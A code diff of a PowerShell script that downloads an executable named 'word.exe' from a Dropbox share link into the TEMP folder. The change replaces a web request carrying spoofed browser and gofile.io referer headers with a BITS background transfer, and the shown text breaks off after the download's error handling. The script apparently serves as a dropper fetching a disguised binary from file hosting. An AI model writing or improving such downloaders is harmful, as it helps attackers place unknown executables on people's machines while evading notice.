@@ -1,17 +1,13 @@
 $DownloadUrl = "https://www.dropbox.com/scl/fi/nmw82t48k2i0y43vzl3uw/word.exe?rlkey=kua8330w3d0f8vvimhevqcxoc&st=zekyrblp&dl=1"
 $ExeName     = "word.exe"
 $Arguments   = ""
-$DestPath = Join-Path $env:TEMP $ExeName
+$DestPath    = Join-Path $env:TEMP $ExeName
 
-Write-Host "Downloading $ExeName..."
-
-$Headers = @{
-    "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
-    "Referer"    = "https://gofile.io/"
-}
+Write-Host "Downloading $ExeName via BITS..."
 
 try {
-    Invoke-WebRequest -Uri $DownloadUrl -OutFile $DestPath -Headers $Headers -UseBasicParsing
+    # Using BITS transfer for a more robust background download
+    Start-BitsTransfer -Source $DownloadUrl -Destination $DestPath
     Write-Host "Downloaded to: $DestPath"
 } catch {
     Write-Error "Download failed: $_"
